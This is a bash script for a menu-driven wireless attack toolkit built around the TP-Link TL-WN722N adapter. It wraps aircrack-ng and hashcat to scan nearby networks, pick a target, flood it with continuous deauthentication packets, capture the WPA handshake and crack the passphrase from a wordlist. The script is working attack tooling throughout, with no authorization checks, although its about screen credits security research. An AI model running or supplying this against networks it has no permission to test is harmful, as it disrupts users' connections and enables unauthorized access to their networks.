#!/bin/bash

# ==============================================
# Wireless Toolkit for TP-Link TL-WN722N v1
# Optimized for Arch Linux
# ==============================================

# Global Config
INTERFACE=""
MON_IFACE=""
HANDSHAKE_FILE=""
SCAN_FILE="wifi_scan.csv"
WORDLIST=""
CRACK_TOOL=""
TMP_DIR="/tmp/wifi_tool"

# Color Scheme
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Dependency Check
check_deps() {
    local deps=("aircrack-ng" "aireplay-ng" "airodump-ng" "fzf" "screen" "xterm")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[!] Missing dependencies:${NC}"
        printf ' - %s\n' "${missing[@]}"
        echo -e "\nInstall with:"
        echo -e "sudo pacman -S ${missing[@]}"
        exit 1
    fi
}

# TP-Link Specific Initialization
tp_link_init() {
    # Load necessary modules
    sudo modprobe ath9k_htc 2>/dev/null
    sudo modprobe mac80211 2>/dev/null
    
    # Create working directory
    mkdir -p "$TMP_DIR"
    cd "$TMP_DIR" || exit 1
}

# Interface Selection
select_interface() {
    clear
    echo -e "${YELLOW}[*] Scanning for TP-Link interfaces...${NC}"
    
    # Detect TP-Link interfaces
    mapfile -t interfaces < <(airmon-ng | awk '/ath9k_htc/ {print $2}')
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo -e "${RED}[!] No TP-Link interfaces found!${NC}"
        echo -e "Possible reasons:"
        echo -e "1. Device not connected"
        echo -e "2. Driver not loaded"
        echo -e "3. Hardware defect\n"
        read -p "Press Enter to retry..."
        select_interface
        return
    fi
    
    INTERFACE=$(printf '%s\n' "${interfaces[@]}" | fzf --prompt="Select interface > " --header="Detected Interfaces")
    [ -z "$INTERFACE" ] && main_menu
    
    setup_monitor_mode
}

# Monitor Mode Setup
setup_monitor_mode() {
    echo -e "${YELLOW}[*] Initializing monitor mode...${NC}"
    
    # Cleanup existing processes
    sudo airmon-ng check kill &>/dev/null
    sudo rfkill unblock all
    
    # Start monitor mode
    if ! sudo airmon-ng start "$INTERFACE" &>/dev/null; then
        echo -e "${RED}[!] Failed to start monitor mode!${NC}"
        echo -e "Try manual command:"
        echo -e "sudo airmon-ng start $INTERFACE\n"
        read -p "Press Enter to continue..."
        return 1
    fi
    
    # Verify interface
    MON_IFACE=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}' | head -1)
    
    if [ -z "$MON_IFACE" ]; then
        echo -e "${RED}[!] Monitor interface not found!${NC}"
        return 1
    fi
    
    echo -e "${GREEN}[+] Monitor mode active on ${BLUE}$MON_IFACE${NC}"
    sleep 1
    operation_menu
}

# Main Operations Menu
operation_menu() {
    choice=$(printf '%s\n' \
        "Attack Mode (Deauth + Capture)" \
        "Sniffing Mode (Passive)" \
        "Return to Main Menu" | fzf --height=40% --prompt="Select Mode > " --header="Operation Modes")
    
    case "$choice" in
        "Attack Mode (Deauth + Capture)") attack_mode ;;
        "Sniffing Mode (Passive)") sniffing_mode ;;
        "Return to Main Menu") main_menu ;;
    esac
}

# Attack Mode Workflow
attack_mode() {
    start_scan || return
    select_target || return
    capture_handshake
    if [ $? -eq 0 ]; then
        select_wordlist
        select_crack_method
        execute_crack
    else
        echo -e "${RED}[!] Handshake capture failed!${NC}"
    fi
    cleanup
}

# Network Scanning
start_scan() {
    echo -e "${YELLOW}[*] Scanning networks (20 seconds)...${NC}"
    timeout 20s sudo airodump-ng -w scan --output-format csv "$MON_IFACE" &>/dev/null
    
    if [ ! -f scan-01.csv ]; then
        echo -e "${RED}[!] Scan failed! Check interface${NC}"
        return 1
    fi
    
    # Process scan results
    sed -i '/^Station MAC/,$d' scan-01.csv
    mv scan-01.csv "$SCAN_FILE"
    echo -e "${GREEN}[+] Scan results saved to ${BLUE}$SCAN_FILE${NC}"
}

# Target Selection
select_target() {
    target=$(awk -F',' 'NR>5 && length($1)==17 {print $1","$4","$6}' "$SCAN_FILE" | 
        fzf --delimiter=',' --with-nth=1,3 --header="BSSID,Channel,ESSID")
    
    [ -z "$target" ] && return 1
    
    BSSID=$(cut -d',' -f1 <<< "$target")
    CHANNEL=$(cut -d',' -f2 <<< "$target" | xargs)
    ESSID=$(cut -d',' -f3 <<< "$target")
}

# Handshake Capture Process
capture_handshake() {
    echo -e "${YELLOW}[*] Targeting ${BLUE}$ESSID${YELLOW} (BSSID: $BSSID)${NC}"
    
    # Start capture in background
    screen -dmS airodump sudo airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w handshake "$MON_IFACE"
    screen -dmS aireplay sudo aireplay-ng --deauth 0 -a "$BSSID" "$MON_IFACE"
    
    echo -e "${GREEN}[+] Capture running... Press Enter to stop${NC}"
    read -r
    
    # Stop processes
    screen -S airodump -X quit
    screen -S aireplay -X quit
    
    # Verify handshake
    if [[ -f handshake-01.cap ]] && aircrack-ng handshake-01.cap 2>/dev/null | grep -q "1 handshake"; then
        HANDSHAKE_FILE="$TMP_DIR/handshake-01.cap"
        echo -e "${GREEN}[+] Handshake captured successfully!${NC}"
        return 0
    else
        echo -e "${RED}[!] No handshake detected${NC}"
        return 1
    fi
}

# Wordlist Selection
select_wordlist() {
    while true; do
        WORDLIST=$(find ~/ -type f \( -name "*.txt" -o -name "*.lst" \) 2>/dev/null |
            fzf --height=80% --preview="head -n 25 {}" --prompt="Select Wordlist > ")
        
        [ -n "$WORDLIST" ] && break
        echo -e "${RED}[!] No wordlist selected!${NC}"
    done
}

# Cracking Method Selection
select_crack_method() {
    CRACK_TOOL=$(printf '%s\n' "aircrack-ng (CPU)" "hashcat (GPU)" | 
        fzf --prompt="Select Method > " --header="Cracking Options")
}

# Execute Cracking Process
execute_crack() {
    case "$CRACK_TOOL" in
        "aircrack-ng (CPU)")
            xterm -fa 'DejaVu Sans Mono' -fs 10 -T "Aircrack-ng" -e \
                "aircrack-ng -w '$WORDLIST' '$HANDSHAKE_FILE'; read -p 'Press Enter to close...'" &
            ;;
        "hashcat (GPU)")
            hc_file="${HANDSHAKE_FILE%.cap}.hccapx"
            aircrack-ng "$HANDSHAKE_FILE" -J "${hc_file%.*}" &>/dev/null
            xterm -fa 'DejaVu Sans Mono' -fs 10 -T "Hashcat" -e \
                "hashcat -m 22000 '$hc_file' '$WORDLIST'; read -p 'Press Enter to close...'" &
            ;;
    esac
}

# Sniffing Mode
sniffing_mode() {
    start_scan || return
    echo -e "${GREEN}[+] Sniffing completed. Results saved to ${BLUE}$SCAN_FILE${NC}"
    read -p "Press Enter to return..."
    cleanup
}

# Cleanup Operations
cleanup() {
    echo -e "${YELLOW}[*] Cleaning up...${NC}"
    sudo airmon-ng stop "$MON_IFACE" &>/dev/null
    screen -wipe &>/dev/null
    rm -rf "$TMP_DIR"/{scan-*,handshake-*,*.csv,*.netxml}
    sudo systemctl restart NetworkManager &>/dev/null
}

# Main Menu
main_menu() {
    while true; do
        choice=$(printf '%s\n' \
            "Select Interface" \
            "About" \
            "Credits" \
            "Exit" | fzf --height=40% --prompt="Main Menu > " --header="TP-Link Wireless Toolkit")
        
        case "$choice" in
            "Select Interface") select_interface ;;
            "About") show_about ;;
            "Credits") show_credits ;;
            "Exit") exit 0 ;;
        esac
    done
}

# Information Screens
show_about() {
    clear
    echo -e "${BLUE}TP-Link Wireless Toolkit${NC}"
    echo "Version: 2.1"
    echo "Author: Network Security Research"
    echo -e "\nFeatures:"
    echo -e " - Targeted handshake capture"
    echo -e " - Integrated deauthentication"
    echo -e " - Hashcat/aircrack integration"
    echo -e " - Passive network scanning"
    read -p "Press Enter to return..."
}

show_credits() {
    clear
    echo -e "${BLUE}Credits & Acknowledgments${NC}"
    echo "==========================="
    echo -e " - Aircrack-ng Development Team"
    echo -e " - Hashcat Development Team"
    echo -e " - Linux Wireless Community"
    echo -e " - Open Source Security Tools"
    read -p "Press Enter to return..."
}

# Initialization
trap cleanup EXIT INT TERM
check_deps
tp_link_init
main_menu
